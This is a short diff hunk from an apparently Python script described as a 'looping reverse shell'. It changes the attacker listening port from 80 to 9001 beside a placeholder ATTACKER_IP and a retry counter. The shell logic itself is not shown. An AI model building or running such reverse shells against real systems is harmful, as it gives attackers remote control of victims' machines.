@@ -8,7 +8,7 @@ Looping reverse shell
 '''
 def main():
     ATTACKER_IP = '<ATTACKER_IP>'
-    ATTACKER_LISTENING_PORT = 80
+    ATTACKER_LISTENING_PORT = 9001
 
     counter = 0
     MAX_COUNTER = 100
